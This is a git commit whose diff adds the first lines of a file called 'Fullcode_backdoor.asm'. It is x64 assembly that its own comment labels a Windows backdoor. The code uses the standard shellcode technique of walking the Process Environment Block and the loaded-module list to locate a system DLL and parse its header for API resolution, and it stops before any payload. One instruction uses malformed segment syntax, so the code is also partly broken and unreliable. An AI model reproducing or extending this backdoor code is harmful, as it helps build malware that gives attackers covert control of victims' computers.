b5de644137a36038ae22dd6031a300fef85f83fb
Ciro-k <kirill00w@gmail.com>
2026-07-14 16:37:17 +0200

    Update Fullcode_backdoor.asm

--- Fullcode_backdoor.asm
+++ Fullcode_backdoor.asm
@@ -1,1 +1,14 @@
+; backdoor for windows 
 
+.code
+align 16
+start PROC
+
+  mov rax, :gs[060h]
+  mov rax, [rax + 018h]
+  mov rsi, [rax + 020h]
+  mov rsi, [rsi]
+  mov rsi, [rsi]
+  mov r15, [rsi + 020h]
+
+  mov eax, dword ptr [r15 + 03Ch]
